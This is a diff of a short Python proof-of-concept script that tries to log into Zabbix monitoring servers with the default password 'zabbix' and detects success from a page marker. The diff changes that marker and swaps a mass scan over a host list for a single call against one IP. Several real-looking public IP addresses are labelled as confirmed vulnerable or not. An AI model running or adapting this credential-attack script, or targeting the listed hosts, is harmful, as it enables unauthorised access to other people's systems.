@@ -59,7 +59,7 @@ def poc(url):
         dic['password'] = 'zabbix'
         # print dic
         r = s.post(url + '/index.php', data=dic, headers=h2, timeout=10)
-        if '<title>' in r.content:
+        if 'chkbxRange.init();' in r.content:
             for each in blacklist:
                 if each in r.content:
                     return False
@@ -74,8 +74,4 @@ if __name__ == '__main__':
     url1 = 'http://54.222.167.52/'  # True
     url2 = 'http://180.235.64.209:8080/'  # True
     unsuccess_url = 'http://101.198.161.9'  # False
-    # print poc('http://106.2.60.133/')
-
-    for each in open('../data/zabbix_cn', 'r'):
-        if poc(each):
-            print each
+    print poc('http://106.2.60.133/')
